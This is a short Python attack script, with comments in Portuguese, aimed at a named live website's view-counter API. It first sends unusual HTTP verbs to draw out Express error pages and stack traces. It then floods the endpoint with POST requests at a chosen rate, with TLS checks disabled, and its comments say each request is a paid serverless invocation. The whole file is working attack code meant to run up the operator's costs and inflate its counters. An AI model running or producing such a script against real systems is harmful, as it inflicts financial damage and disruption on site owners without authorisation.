#!/usr/bin/env python3
# backend_trace.py — item 1: extrai stack do 405 Express + flood do endpoint vivo
import urllib.request,json,ssl,time,sys,random
BASE="https://woiz.com.br/api/f40/views"
ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
def raw_method(m,path="/api/f40/views"):
    try:
        req=urllib.request.Request(f"https://woiz.com.br{path}",method=m)
        r=urllib.request.urlopen(req,timeout=8,context=ctx);return r.status,r.read()[:2000]
    except urllib.error.HTTPError as e:return e.code,e.read()[:2000]
    except Exception as e:return "ERR",str(e)[:200].encode()
# 1) dump do 405 com rota exótica (puxa o HTML grande da página de erro Express)
print("== TRACE / OPTIONS / verbos exóticos ==")
for m in ["TRACE","OPTIONS","PUT","PATCH","DELETE"]:
    s,b=raw_method(m)
    fn=f"trace_{m.lower()}.html"
    open(fn,"wb").write(b)
    print(f"  {m:<8} -> [{s}] salvo em {fn} ({len(b)} bytes)")
# 2) flood POST válido: cada hit = invocação serverless paga
rps=float(sys.argv[1]) if len(sys.argv)>1 else 10.0
print(f"\n[*] flood POST {rps} req/s no endpoint vivo (cada POST = invocação paga)")
import uuid
ok=fail=0
try:
    while True:
        uid=str(uuid.uuid4())
        try:
            req=urllib.request.Request(BASE,data=json.dumps({"viewId":uid}).encode(),headers={"Content-Type":"application/json"},method="POST")
            r=urllib.request.urlopen(req,timeout=8,context=ctx);ok+=1;cur=json.loads(r.read()).get("views")
            print(f"[+] 200 views={cur} ok={ok}",flush=True)
        except urllib.error.HTTPError as e:fail+=1;print(f"[-] {e.code} fail={fail}",flush=True)
        except Exception as e:fail+=1;print(f"[!] {e}",flush=True)
        time.sleep(1.0/rps)
except KeyboardInterrupt:
    print(f"\n[*] encerrado. ok={ok} fail={fail}")
